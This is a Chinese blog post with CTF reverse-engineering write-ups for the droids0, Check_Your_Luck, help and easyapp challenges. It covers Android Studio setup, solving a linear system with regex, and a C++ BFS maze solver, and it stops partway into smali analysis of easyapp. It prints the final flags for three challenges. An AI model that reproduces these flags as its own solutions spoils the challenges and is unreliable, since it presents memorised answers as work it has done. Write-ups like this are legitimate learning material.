        <content type="html"><![CDATA[<h1 id="re">RE</h1><h2 id="droids0-pico2019">droids0(pico2019):</h2><p>这是一个安卓逆向的入门题(根本没有逆向,老样子在帮你部署环境),根据hint去安装了Android Studio</p><p>​资料:</p><p>​<a href="https://blog.csdn.net/weixin_43734793/article/details/124966390">https://blog.csdn.net/weixin_43734793/article/details/124966390</a></p><p>​<a href="https://blog.csdn.net/andylao62/article/details/23456881">https://blog.csdn.net/andylao62/article/details/23456881</a></p><h3 id="安装的一点点事情">安装的一点点事情:</h3><p>​1.电脑要有JDK5或之后的版本</p><p>​2.安装后的初始化出现网络问题,即无法访问插件网址,这里因为电脑有某lash,进行了手动的代理设置</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728112025801.png" alt="image-20230728112025801" style="zoom:50%;" /></p><p>​正在疯狂解压↑</p><p>​<s>感觉和Jetbrain家风格好像(难道是一家的?)</s></p><p>​<s>怎么好多东西都是第一次使用要在线下载</s></p><h3 id="现在就直接运行一遍">现在就直接运行一遍</h3><p>​根据提示了解到flag会在log中输出,直接运行就行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114115242.png" alt="image-20230728114115242" style="zoom: 25%;" /></p><p>​flag:   picoCTF{a.moose.once.bit.my.sister}</p><p>​虽然不是很懂,特别是连java都不会,但是好歹环境没问题</p><p>​<s>正解</s>到这里就结束了</p><h3 id="现在记录一点折腾的过程">现在记录一点折腾的过程</h3><p>​<s>听说java中间会解释出某种叫做字节码的东西</s></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114819343.png" alt="image-20230728114819343" style="zoom:50%;" /></p><p>​假装看懂↑</p><p>​不管如何,我们凭借着c++(学姬算鸡)的底子,了解到怎么也得是先找到main函数入口:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114942680.png" alt="image-20230728114942680" style="zoom: 50%;" /></p><p>​然后虽然看不懂字节码,但是硬看…(主要是现在还没有去搞java逆向的工具…待会儿折腾…):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115047864.png" alt="image-20230728115047864" style="zoom:50%;" /></p><p>​你发现了吗…再往下看,凭借我小学800词的英语底子我看到了这个:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115206070.png" alt="image-20230728115206070" style="zoom:50%;" /></p><p>​看来是某个类方法,但是属实是不会看这字节码,也不了解java apk的变量结构(<s>那就学</s>):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115525767.png" alt="image-20230728115525767" style="zoom:50%;" /></p><p>​经过学习某个叫做smail的东西,我们可以知道是调用了某个静态函数(不知道是全局函数还是静态成员方法—java有全局函数吗?),那么进一步分析语法去找参数吧</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120749186.png" alt="image-20230728120749186" style="zoom:50%;" /></p><p>​这东西为啥是空的…到此为止…字节码分析失败,以后还是得去看看java逆向,光有字节码不行</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120855903.png" alt="image-20230728120855903" style="zoom:50%;" /></p><p>​盲猜v0寄存器里存的就是flag的主体,跪求哪位椰叶如果知道这个做法有没有搞头,评论踢我一脚…</p><p>​</p><p>​到此为止吧,至少运行跑出来了…</p><h2 id="check-your-luck">Check_Your_Luck</h2><p>很显然是求解线性方程组…但是我手头没有代码(线代老师饶了我吧QWQ)</p><p>我们使用正则(我太懒了):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patt:</span><br><span class="line">\(v \* (-?[\d]+) \+ w \* (-?[\d]+) \+ x \* (-?[\d]+) \+ y \* (-?[\d]+) \+ z \* (-?[\d]+) \=\= (-?[\d]+)\)</span><br><span class="line">替换为:</span><br><span class="line">$1,$2,$3,$4,$5 $6\n</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130450039.png" alt="image-20230728130450039" style="zoom: 50%;" /><p>处理后,丢入到在线计算线性方程组中(因为我没有写过求解线性方程组的代码—回头补上):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130615285.png" alt="image-20230728130615285" style="zoom: 50%;" /></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130824736.png" alt="image-20230728130824736" style="zoom:33%;" /></p><p>​现在直接组装起flag即可…或者运行一遍…</p><p>​flag{4544_123_677_1754_777}注意要换成NSSCTF{4544_123_677_1754_777}</p><p>​正则真是个好东西啊,怎么各位做题都不用捏?<s>(还是说椰叶们用了但WP里没写)</s></p><p>​结束…</p><h2 id="help">help</h2><p>​代码都一看就懂,会生成一个map地图,动调提取出来,然后肉眼写吧(路径是wasd四个方向也一眼就看出来了)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728175513441.png" alt="image-20230728175513441" style="zoom:45%;" /><p>​处理脚本:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BFS实现</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> map2[] = &#123;</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; map2[i];</span><br><span class="line">        <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​然后就手动对着16x16的地图走一遍吧,懒得再整代码之类的了(太麻烦了吧)—更新:代码已整(见结尾部分↓)</p><p>​整理出来某段该死的路径(眼睛快瞎了):</p><p>​wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</p><p>​在线md5出来:a8622109e2fb1296e06d5eed6f78f954</p><p>​记得外面是NSSCTF{}  <s>nnd试了半天才知道是这个格式才对,就不能说清楚</s></p><p>​flag: NSSCTF{a8622109e2fb1296e06d5eed6f78f954}</p><p>更新:走迷宫代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> map[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">&#125; pre[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> vis[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">R</span> destination;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">struct</span> R&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">    pre[x][y] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    vis[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">R</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (map[now.x][now.y] == <span class="number">-1</span>) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            destination = now;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x1 = now.x + dx[i];</span><br><span class="line">            <span class="type">int</span> y1 = now.y + dy[i];</span><br><span class="line">            <span class="keyword">if</span> (x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt;= <span class="number">15</span> &amp;&amp; y1 &gt;= <span class="number">0</span> &amp;&amp; y1 &lt;= <span class="number">15</span> &amp;&amp; !vis[x1][y1] &amp;&amp; map[x1][y1] != <span class="number">1</span>) &#123;</span><br><span class="line">                vis[x1][y1] = <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;x1, y1&#125;);</span><br><span class="line">                pre[x1][y1] = now;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_route</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">R</span> now = destination;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; route;</span><br><span class="line">    <span class="keyword">while</span> (!(pre[now.x][now.y].x == <span class="number">-1</span> &amp;&amp; pre[now.x][now.y].y == <span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> sub_x = now.x - pre[now.x][now.y].x;</span><br><span class="line">        <span class="type">int</span> sub_y = now.y - pre[now.x][now.y].y;</span><br><span class="line">        <span class="keyword">if</span> (sub_x &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &lt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_x &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sub_y &gt; <span class="number">0</span>)</span><br><span class="line">            route.<span class="built_in">push_back</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        now=pre[now.x][now.y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(route.<span class="built_in">begin</span>(), route.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i: route)</span><br><span class="line">        cout &lt;&lt; i;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">bfs</span>(<span class="number">15</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print_route</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​结束…</p><h2 id="easyapp">easyapp</h2><p>​附件还挺花…没有zip后缀…</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728182839055.png" alt="image-20230728182839055" style="zoom:33%;" /></p><p>​加上然后解压出来个apk…继续整吧,不会java是真的麻烦…</p><p>​又是smail…看来得学学这玩意…</p><h3 id="第一部分-encoder类">第一部分—encoder类</h3><p>​总之就是分析代码…首先发现main中对输入的字符串进行了encode方法的调用,也就是所我们先要去查看encoder类:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200832325.png" alt="image-20230728200832325" style="zoom:50%;" /></p><p>​这里有个key的field(别问我这是什么…我没学过java…貌似是某种数据段)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728200946254.png" alt="image-20230728200946254" style="zoom:50%;" /></p><p>​而且赋初值为0x75bcd15,继续分析发现后续代码有一个逻辑上的映射变换</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728201437225.png" alt="image-20230728201437225" style="zoom:45%;" 